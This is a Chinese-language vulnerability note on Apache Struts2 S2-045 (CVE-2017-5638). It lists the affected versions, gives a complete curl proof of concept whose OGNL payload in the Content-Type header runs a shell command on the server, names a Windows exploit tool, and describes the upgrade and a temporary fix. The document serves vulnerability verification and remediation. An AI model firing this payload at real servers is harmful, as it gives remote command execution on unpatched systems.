# Struts2
Struts是Apache基金会的一个开源项目，Struts通过采用Java Servlet/JSP技术，实现了基于Java EE Web应用的Model-View-Controller(MVC)设计模式的应用框架，是MVC经典设计模式中的一个经典产品。

目前，Struts框架广泛应用于政府、公安、交通、金融行业和运营商的网站建设，作为网站开发的底层模板使用，是应用最广泛的Web应用框架之一。
## S2-045 CVE-2017-5638
### 漏洞说明


### 影响范围
2.3.31-2.3.5 2.5-2.5.10
### 验证方法
s2_045.py
```bash
curl -i -s -k  -X $'POST' \
    -H $'Host: 192.168.95.1:8081' -H $'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36' -H $'Accept: */*' -H $'Connection: close' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: %{(#fuck=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=\'whoami\').(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).(#cmds=(#iswin?{\'cmd.exe\',\'/c\',#cmd}:{\'/bin/bash\',\'-c\',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}' -H $'Content-Length: 0' \
    $'http://10.228.31.149:82/index.action'
```
**windows**: K8_exp.exe

### 利用方法
**windows**: K8_exp.exe

### 修复方法
**1.官方解决方案**
官方已经发布版本更新，尽快升级到不受影响的版本（Struts 2.3.32或Struts 2.5.10.1）或struts2最新版本，建议在升级前做好数据备份。

Struts 2.3.32:https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.3.32
Struts 2.5.10.1:https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.5.10.1

2.临时修复方案
在用户不便进行升级的情况下，作为临时的解决方案，用户可以进行以下操作来规避风险：
在WEB-INF/classes目录下的struts.xml 中的struts 标签下添加
`<constant name="struts.custom.i18n.resources" value="global" />`
在WEB-INF/classes/ 目录下添加 global.properties，文件内容如下：
`struts.messages.upload.error.InvalidContentTypeException=1`


## S2-057 